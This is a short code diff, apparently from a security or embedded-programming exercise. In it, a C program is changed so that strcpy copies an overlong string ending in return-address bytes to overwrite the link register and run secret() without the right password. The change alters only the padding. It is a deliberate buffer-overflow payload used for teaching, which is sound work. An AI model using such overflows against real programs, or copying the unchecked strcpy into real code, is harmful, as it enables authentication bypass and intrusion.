@@ -15,7 +15,7 @@ int main(void) {
 	
 	// Try to overwrite the link register here so that secret() is run
 	// even if the password is incorrect
-	strcpy(attempt, "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x41\x03\x00\x08");
+	strcpy(attempt, "ahdentcksielstdhench\x41\x03\x00\x08");
 	if (0 == strcmp(attempt, pwd_store)) {
 		secret();
 	}
